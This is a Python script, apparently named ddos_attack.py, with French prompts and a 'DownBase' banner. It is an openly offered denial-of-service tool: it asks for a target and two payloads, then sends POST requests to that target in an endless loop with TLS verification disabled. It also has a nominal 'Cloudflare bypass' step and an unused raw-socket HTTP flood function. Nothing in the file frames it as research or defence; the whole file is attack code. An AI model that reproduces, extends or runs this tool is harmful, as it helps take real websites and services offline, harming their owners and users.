import requests
import sys
import time
from threading import Thread
import socket
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style

# Initialisation de Colorama pour la couleur de la console
init()

class DDosAttack:
    def __init__(self, target, payloads, use_ssl):
        self.target = target
        self.payloads = payloads
        self.use_ssl = use_ssl

    def bypass_cf(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
            'Connection': 'close',
        }
        requests.get(self.target, headers=headers, verify=False)
        time.sleep(3)

    def start_attack(self):
        try:
            self.bypass_cf()
            while True:
                for payload in self.payloads:
                    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                    data = payload
                    if self.use_ssl:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        response = requests.post(self.target, headers=headers, data=data, verify=False)
                    else:
                        response = requests.post(self.target, headers=headers, data=data)
                    if response.status_code == 200:
                        print(Fore.GREEN + "[+] DoS réussi" + Style.RESET_ALL)
                    else:
                        print(Fore.RED + "[-] DoS échoué" + Style.RESET_ALL)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[+] Attaque annulée." + Style.RESET_ALL)
            sys.exit(0)
        except Exception as e:
            print(Fore.RED + f"\n[-] Erreur: {e}" + Style.RESET_ALL)
            sys.exit(1)

def flood(target, port, num):
    count = 0
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        count += 1
        if count >= num:
            break

if __name__ == "__main__":
    # Bannière ASCII
    ascii_banner = r"""
    $$$$$$$\                                    $$$$$$$\                                
    $$  __$$\                                   $$  __$$\                               
    $$ |  $$ | $$$$$$\  $$\  $$\  $$\ $$$$$$$\  $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  
    $$ |  $$ |$$  __$$\ $$ | $$ | $$ |$$  __$$\ $$$$$$$\ | \____$$\ $$  _____|$$  __$$\ 
    $$ |  $$ |$$ /  $$ |$$ | $$ | $$ |$$ |  $$ |$$  __$$\  $$$$$$$ |\$$$$$$\  $$$$$$$$ |
    $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$ |  $$ |$$  __$$ | \____$$\ $$   ____|
    $$$$$$$  |\$$$$$$  |\$$$$$\$$$$  |$$ |  $$ |$$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ 
    \_______/  \______/  \_____\____/ \__|  \__|\_______/  \_______|\_______/  \_______|
    """

    print(Fore.YELLOW + ascii_banner + Style.RESET_ALL)

    # Vérifie si des arguments sont passés en ligne de commande
    if len(sys.argv) != 1:
        print(Fore.RED + "Usage: python ddos_attack.py" + Style.RESET_ALL)
        sys.exit(1)

    target = input("Entrez l'IP cible or URL : ")
    payload1 = input("Entrez le premier payload : ")
    payload2 = input("Entrez le deuxième payload : ")
    use_ssl = input("Utilisez-vous SSL? (y/n) : ") == 'y'

    payloads = [payload1, payload2]

    attack = DDosAttack(target, payloads, use_ssl)
    attack.start_attack()
